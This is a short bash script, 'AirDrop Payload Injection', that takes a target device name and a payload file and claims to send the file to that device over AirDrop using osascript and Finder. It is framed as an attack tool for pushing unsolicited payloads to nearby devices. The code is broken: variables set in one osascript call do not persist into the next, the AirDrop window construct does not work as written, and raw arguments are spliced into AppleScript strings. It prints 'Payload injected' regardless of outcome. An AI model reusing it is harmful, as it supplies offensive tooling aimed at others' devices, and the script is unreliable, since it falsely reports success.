#!/bin/bash
# AirDrop Payload Injection
# Usage: airdrop_payload_inject.sh <target_device_name> <payload_file>

TARGET_DEVICE=$1
PAYLOAD_FILE=$2

if [ -z "$TARGET_DEVICE" ] || [ -z "$PAYLOAD_FILE" ]; then
    echo "Usage: $0 <target_device_name> <payload_file>"
    exit 1
fi

echo "Injecting payload to AirDrop device: $TARGET_DEVICE"

# Use 'osascript' to send a file via AirDrop (macOS required)
osascript -e 'tell application "Finder" to set targetDevice to first item of (every AirDrop window whose name is "'$TARGET_DEVICE'")'
osascript -e 'tell application "Finder" to set payloadFile to POSIX file "'$PAYLOAD_FILE'"'
osascript -e 'tell application "Finder" to move payloadFile to targetDevice'

echo "Payload injected via AirDrop."
